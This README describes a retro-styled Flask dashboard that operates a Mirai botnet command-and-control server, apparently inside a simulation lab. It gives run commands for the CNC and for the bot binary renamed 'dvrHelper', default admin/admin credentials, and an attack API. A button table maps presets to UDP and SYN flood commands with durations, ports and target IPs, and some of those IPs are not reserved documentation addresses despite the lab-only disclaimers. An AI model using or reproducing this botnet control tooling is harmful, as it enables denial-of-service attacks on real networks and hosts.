# Soft Command Deck.exe - Mirai Lab Dashboard

Retro Windows XP / Windows 2000 dashboard for the **isolated Mirai simulation lab**.  
Replaces manual `telnet 127.0.0.1 23` -> login -> `botcount` with a live UI.

> **Educational / lab only.** Run only inside your offline Proxmox lab.  
> Do not point this at any real network.

---

## What you get

| Feature | Description |
|--------|-------------|
| **Live bot count** | Auto-polls CNC admin session (no more typing `botcount`) |
| **One-tap actions** | Bot count, lab attack presets (SG / KR), full status |
| **Custom command** | Same grammar as `admin@botnet#` |
| **Live console** | Aggregated dashboard ↔ CNC logs |
| **Topology map** | C2 / Loader / Bot / targets at a glance |
| **Retro hacker UI** | XP chrome, beveled controls, HyperTerminal console |

## Theme notes

- Frontend stays pure static HTML/CSS/JS, served by Flask from `dashboard/frontend/`.
- The visual shell uses XP Luna title bars, grey window chrome, inset panels, menu bars, classic buttons, and a taskbar footer.
- Terminal panels use `Lucida Console` / `Courier New` style mono text with green-on-black CRT treatment.
- CNC link status is green when online and red when offline.
- Bot count status is green when bots are connected and yellow when the count is `0`, so "waiting for bots" is not confused with CNC failure.
- No backend API contract changes were made for the theme.

Architecture:

```
Browser  →  Flask :8080  →  TCP CNC :23 (admin login)
                         →  optional ss peer count
```

Bot count still comes from **CNC in-memory** (`clientList`), same as the telnet UI.

---

## Layout

```
dashboard/
├── README.md
├── backend/
│   ├── app.py              # Flask API + static server
│   ├── cnc_client.py       # Telnet-style CNC client
│   └── requirements.txt
├── frontend/
│   ├── index.html
│   ├── style.css
│   └── app.js
├── proxmox_lab_setup.md
└── wireshark_guide.md
```

---

## Run on C2 (`185.10.20.100`)

### 1) CNC must already be running

```bash
cd ~/Mirai-Botnet-Simulation-Lab/mirai/release
ss -lntp | grep :23
# if empty:
nohup ./cnc > cnc.log 2>&1 &
```

### 2) Install & start dashboard

Quick path:

```bash
cd ~/Mirai-Botnet-Simulation-Lab/dashboard
./start.sh
```

Manual path:

```bash
cd ~/Mirai-Botnet-Simulation-Lab/dashboard/backend
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 app.py
```

Open in browser:

- On C2: [http://127.0.0.1:8080](http://127.0.0.1:8080)
- From your PC (if routed): `http://185.10.20.100:8080`

Background:

```bash
nohup python3 app.py > dashboard.log 2>&1 &
```

### 3) Optional environment

```bash
export CNC_HOST=127.0.0.1
export CNC_PORT=23
export CNC_USER=admin
export CNC_PASS=admin
export DASH_PORT=8080
export LAB_TARGET_SG=203.0.113.100
export LAB_TARGET_KR=210.89.0.100
python3 app.py
```

Default CNC login matches `scripts/db.sql`: **admin / admin**.

---

## API (for tinkering)

| Method | Path | Purpose |
|--------|------|---------|
| GET | `/api/status` | CNC up, bot total, distribution, TCP peers, logs |
| POST | `/api/botcount` | Force `botcount` |
| POST | `/api/command` | `{"command":"botcount"}` |
| POST | `/api/attack` | `{"target":"sg"|"kr", "duration":30, "method":"udp"}` |

---

## Button -> command mapping

| UI button | Endpoint | CNC command or payload |
|-----------|----------|------------------------|
| Bot Count | `POST /api/command` | `botcount` |
| Refresh status / Full Status | `GET /api/status` | Status poll only |
| UDP SG 10s | `POST /api/attack` | `{"target":"sg","method":"udp","duration":10,"dport":80}` -> `udp 203.0.113.100 10 dport=80` |
| UDP SG 30s | `POST /api/attack` | `{"target":"sg","method":"udp","duration":30,"dport":80}` -> `udp 203.0.113.100 30 dport=80` |
| UDP SG 60s | `POST /api/attack` | `{"target":"sg","method":"udp","duration":60,"dport":80}` -> `udp 203.0.113.100 60 dport=80` |
| UDP KR 10s | `POST /api/attack` | `{"target":"kr","method":"udp","duration":10,"dport":80}` -> `udp 210.89.0.100 10 dport=80` |
| UDP KR 30s | `POST /api/attack` | `{"target":"kr","method":"udp","duration":30,"dport":80}` -> `udp 210.89.0.100 30 dport=80` |
| UDP KR 60s | `POST /api/attack` | `{"target":"kr","method":"udp","duration":60,"dport":80}` -> `udp 210.89.0.100 60 dport=80` |
| SYN SG 20s | `POST /api/attack` | `{"target":"sg","method":"syn","duration":20,"dport":80}` -> `syn 203.0.113.100 20 dport=80` |
| SYN SG 60s | `POST /api/attack` | `{"target":"sg","method":"syn","duration":60,"dport":80}` -> `syn 203.0.113.100 60 dport=80` |
| SYN KR 20s | `POST /api/attack` | `{"target":"kr","method":"syn","duration":20,"dport":80}` -> `syn 210.89.0.100 20 dport=80` |
| SYN KR 60s | `POST /api/attack` | `{"target":"kr","method":"syn","duration":60,"dport":80}` -> `syn 210.89.0.100 60 dport=80` |
| Custom command | `POST /api/command` | Text field value |

---

## How it talks to CNC

1. TCP connect to `CNC_HOST:23` (same port as telnet admin).
2. Login with `CNC_USER` / `CNC_PASS`.
3. Send commands (e.g. `botcount`, `udp 203.0.113.100 30 dport=80`).
4. Parse title bar (`N Bots Connected`) + `botcount` distribution lines.
5. Optionally count non-localhost ESTABLISHED peers via `ss` as a hint.

If the UI says CNC offline: start `./cnc` first.  
If bots stay at 0: fix bot → CNC path (debug `mirai.dbg` / run as `./dvrHelper`).

---

## Bot side reminder (so count goes to 1+)

```bash
# on bot
cp mirai.x86 dvrHelper && ./dvrHelper
# or patched release / mirai.dbg that can reach 185.10.20.100:23
```

Dashboard only **displays and controls** — it does not replace the bot binary.

---

## Safety

- Bind carefully (`0.0.0.0:8080` is fine **inside lab VLANs** only).
- Do not expose this port to the public internet.
- Attack presets use **documentation lab IPs** from the Proxmox guide only.
